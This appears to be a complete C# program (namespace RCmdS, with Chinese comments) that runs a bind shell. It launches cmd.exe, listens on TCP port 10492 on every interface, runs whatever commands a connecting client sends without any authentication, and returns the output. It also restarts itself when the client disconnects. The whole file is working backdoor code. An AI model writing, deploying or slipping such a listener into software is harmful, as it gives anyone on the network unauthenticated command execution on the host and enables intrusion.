using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.IO;

namespace RCmdS
{
    internal class Program
    {
        private static Socket severSocket = null;

        private static Process p;

        private static Queue<string> cmdResultQueue = new Queue<string>();

        private static Socket clientSocket;

        private static void Main(string[] args)
        {

            p = new Process();
            p.StartInfo.FileName = "cmd.exe"; //待执行的文件路径
            p.StartInfo.UseShellExecute = false; //重定向输出，这个必须为false
            p.StartInfo.RedirectStandardError = true; //重定向错误流
            p.StartInfo.RedirectStandardInput = true; //重定向输入流
            p.StartInfo.RedirectStandardOutput = true; //重定向输出流
            p.StartInfo.CreateNoWindow = false; //不启动cmd黑框框
            p.Start();

            severSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Any, 10492);
            severSocket.Bind(endPoint);                 // 绑定
            severSocket.Listen(1);                     // 设置最大连接数
            Console.WriteLine("开始监听");
            //Console.WriteLine("进程ID"+Process.GetCurrentProcess().Id);
            Thread thread = new Thread(ListenClientConnect);        // 开启线程监听客户端连接
            thread.Start("连接成功");


            //Thread thread_1 = new Thread(TEST);        // 开启线程监听客户端连接
            //thread_1.Start("连接成功");

            ThreadPool.QueueUserWorkItem(new WaitCallback(delegate
            {
                while (true)
                {
                    if (p != null && !p.HasExited)
                    {
                        StreamReader sr = p.StandardOutput;
                        string str = sr.ReadLine();
                        Console.WriteLine(str);
                        cmdResultQueue.Enqueue(str);
                    }
                    Thread.Sleep(10);
                }
            }));

            ThreadPool.QueueUserWorkItem(new WaitCallback(delegate
            {
                while (true)
                {
                    if (p != null && !p.HasExited)
                    {
                        StreamReader sr = p.StandardError;
                        string str = sr.ReadLine();
                        Console.WriteLine(str);
                        cmdResultQueue.Enqueue(str);
                    }
                    //Thread.Sleep(10);
                }
            }));


            ThreadPool.QueueUserWorkItem(new WaitCallback(delegate
            {
                while (true)
                {
                    if (clientSocket != null)
                    {
                        while (cmdResultQueue.Count > 0)
                        {
                            clientSocket.Send(Encoding.Default.GetBytes(cmdResultQueue.Dequeue()));
                        }
                    }
                    //Thread.Sleep(10);
                }
            }));

            while (true)
            {
                string cmd = Console.ReadLine();
                p.StandardInput.WriteLine(cmd);
                Console.WriteLine("输出命令");
            }
        }

        /// <summary>
        /// 监听客户端连接
        /// </summary>
        private static void ListenClientConnect(object msg)
        {
            clientSocket = severSocket.Accept();         // 接收客户端连接
            Console.WriteLine("客户端连接成功 信息： " + clientSocket.AddressFamily.ToString());
            clientSocket.Send(Encoding.Default.GetBytes(msg.ToString()));
            Thread revThread = new Thread(ReceiveClientManage);
            revThread.Start(clientSocket);
        }

        private static void ReceiveClientManage(object clientSocket)
        {
            try
            {
                Socket socket = clientSocket as Socket;
                byte[] buffer = new byte[1024];
                while (true)
                {
                    Array.Clear(buffer, 0, buffer.Length);
                    socket.Receive(buffer);        // 从客户端接收消息
                    string cmd = Encoding.Default.GetString(buffer);
                    Console.WriteLine("收到消息：" + cmd);
                    cmd = cmd.Replace("\0", "");
                    Exec(cmd);
                }
            }
            catch (SocketException)
            {
                //客户端断开重启
                severSocket.Close();
                severSocket.Dispose();
                GC.Collect();
                Process.Start(Process.GetCurrentProcess().MainModule.FileName);
                Environment.Exit(0);
            }
        }
        /// <summary>
        /// 执行客户端发来的cmd命令
        /// </summary>
        /// <param name="cmd"></param>
        private static void Exec(string cmd)
        {
            p.StandardInput.WriteLine(cmd);
        }
    }
}
